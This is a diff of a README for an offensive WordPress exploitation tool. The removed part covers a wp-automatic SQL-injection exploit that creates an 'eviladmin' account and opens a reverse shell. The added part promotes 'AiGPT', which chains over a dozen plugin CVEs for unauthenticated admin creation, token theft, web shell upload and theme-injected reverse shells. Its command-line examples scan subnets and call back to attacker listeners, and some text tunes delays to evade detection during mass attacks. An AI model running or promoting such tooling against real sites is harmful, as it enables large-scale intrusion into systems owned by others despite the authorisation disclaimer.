@@ -1,60 +1,69 @@
-## WordPress Admin Account Creation and Reverse Shell (cve-2024-27956)
+# AiGPT — Automated WordPress Exploitation Framework
 
-This Python script automates the process of creating a new administrator account in a WordPress site and executing a reverse shell on the target server. It utilizes the wp-automatic plugin's CSV injection vulnerability to execute SQL queries on the WordPress database and gain administrative access.
- 
- 
-## update 🦹‍♀️
- 
-### Nuclei template added
-### add some more methods for supporting massive attack targets 
-### add multiple targets support
-### add Auto find target by scanners base ip or txt file 
+AiGPT is a multi‑vector exploitation tool that automates the discovery and compromise of vulnerable WordPress sites.
+It fingerprints installed plugins, intelligently selects the best exploit, and delivers a reverse shell — often without needing any prior authentication.
 
-## How to use 
+**Thirteen unauthenticated CVEs** are chained into a single, high‑performance framework designed for authorised penetration testing and security research.
 
-- Here are some more advanced examples of how you might use the script, assuming you have the proper authorization to test the target systems.
+[![Python 3.8+](https://img.shields.io/badge/python-3.8%2B-blue.svg)](#)
+[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](#)
 
-1. **Scanning a subnet**: If you want to scan a subnet for vulnerable WordPress installations, you can use the `--subnet` option. For example:
-   ```
-   python wp-automatic-exploit.py --subnet 192.168.1.0/24 --lhost 127.0.0.1 --lport 1414 --threads 10 --delay 1.0
-   ```
-   This command will scan the `192.168.1.0/24` subnet for WordPress sites with the vulnerable WP Automatic plugin, and attempt to exploit them using the provided listener settings.
+---
 
-2. **Customizing the delay**: The delay between requests can be adjusted using the `--delay` option. A higher delay may help avoid detection or rate limiting, while a lower delay can speed up the exploitation process. For example:
-   ```
-   python wp-automatic-exploit.py --targets targets.txt --lhost 127.0.0.1 --lport 1414 --threads 10 --delay 2.5
-   ```
-   This command will use a delay of 2.5 seconds between requests.
+## 🔥 Features
 
-3. **Using a remote listener**: If your listener is set up on a remote machine, you can specify its IP address and port using the `--lhost` and `--lport` options. For example:
-   ```
-   python wp-automatic-exploit.py --targets targets.txt --lhost 192.168.1.100 --lport 8080 --threads 10 --delay 1.0
-   ```
-   This command will connect back to a listener on `192.168.1.100:8080`.
+- **Multi‑vector engine** — 13 distinct exploit paths in one tool
+- **Zero‑auth admin creation** — creates a WordPress administrator on 7 different vulnerable plugins
+- **Token / session hijacking** — steals API tokens or hijacks sessions to gain admin access
+- **Direct SQL execution** — inserts an admin user via raw SQL injection
+- **Direct file upload** — bypasses the entire login chain and drops a web shell instantly
+- **Smart plugin fingerprinting** — parallel probe of 12 plugins to choose the optimal attack
+- **Priority‑based vector selection** — confirmed vulnerable plugins are attacked first
+- **Universal theme‑editor shell** — after admin login, injects a reverse shell into the active theme
+- **CIDR subnet scanning** — finds WordPress installations across entire network ranges
+- **Multi‑threaded** — configurable worker count with adaptive delays
+- **Clean logging** — console + file output with timestamps
+- **Graceful fallback** — non‑WordPress targets are silently skipped
 
-4. **Increasing the number of threads**: You can increase the number of threads used by the script with the `--threads` option. This can speed up the exploitation process, but may also increase the likelihood of detection or cause issues with rate limiting. For example:
-   ```
-   python wp-automatic-exploit.py --targets targets.txt --lhost 127.0.0.1 --lport 1414 --threads 20 --delay 1.0
-   ```
-   This command will use 20 threads for exploitation.
+---
 
+## 📦 Exploited Vulnerabilities (CVEs)
 
-## Prerequisites
+| CVE | Plugin | Type | CVSS |
+|:---|:---|:---|:---|
+| CVE‑2025‑3102 | SureTriggers ≤1.0.78 | Auth bypass → admin creation | 9.8 |
+| CVE‑2025‑8489 | King Addons 24.12.92‑51.1.14 | AJAX role override | 9.8 |
+| CVE‑2025‑4334 | Simple User Registration ≤6.3 | Registration role escalation | 9.8 |
+| CVE‑2025‑6934 | Opal Estate Pro ≤1.7.5 | Unauthenticated admin creation | 9.8 |
+| CVE‑2025‑8572 | Truelysell Core ≤1.8.7 | `user_role` parameter abuse | 9.8 |
+| CVE‑2025‑68860 | Mobile Builder ≤1.4.2 | JWT auth bypass | 9.8 |
+| CVE‑2025‑13618 | Mentoring ≤1.2.8 | Role restriction bypass | 9.8 |
+| CVE‑2025‑11749 | AI Engine ≤3.1.3 | Token theft → admin | 9.8 |
+| CVE‑2025‑34077 | Pie Register ≤3.7.1.4 | Session hijack | 9.8 |
+| CVE‑2025‑13342 | Frontend Admin ≤3.28.20 | Arbitrary options → admin | 9.8 |
+| CVE‑2025‑12061 | Tax Service HDM <1.2.1 | Arbitrary SQL execution | 8.6 |
+| CVE‑2025‑6440 | WooCommerce Dynamic Pricing | File upload → RCE | 9.8 |
+| CVE‑2026‑0740 | Ninja Forms File Uploads ≤3.3.26 | File upload → RCE | 9.8 |
+| CVE‑2026‑4882 | User Reg Advanced Fields ≤1.6.20 | File upload → RCE | 9.8 |
 
-- Python 3.x
-- `requests` library (install via `pip install requests`)
-- Netcat (for setting up a listener to connect to the reverse shell)
+---
 
-## Usage
+## 🚀 Quick Start
 
-1. Replace the `domain` variable in the script with the URL of the target WordPress site.
-2. Run the Python script.
-3. Once the script is executed, it will create a new admin user named `eviladmin`, set the password, and assign administrative privileges.
-4. It will then upload and execute a reverse shell payload on the target server.
-5. Set up a netcat listener to connect to the reverse shell using the specified port.
+### Prerequisites
+- Python 3.8+
+- `pip install requests`
+- (Optional) `pip install pyjwt` for the Mobile Builder vector
 
-**Note:** Ensure that you have proper authorization and permissions before running this script, as it can lead to security vulnerabilities and legal consequences if misused.
+### Basic Usage
 
-## Disclaimer
+```bash
+# Target a list of URLs
+python aigpt.py --targets wp_sites.txt --lhost 10.0.0.5 --lport 4444
 
-This script is provided for educational and testing purposes only. The author assumes no liability for any unauthorized or illegal use of this script. Use it at your own risk.
+# Scan a whole subnet
+python aigpt.py --subnet 192.168.1.0/24 --lhost 10.0.0.5 --lport 4444 --threads 20
+
+# Fine‑tune performance
+python aigpt.py --targets top1000.txt --lhost my-vps.com --lport 1337 --threads 30 --delay 0.3
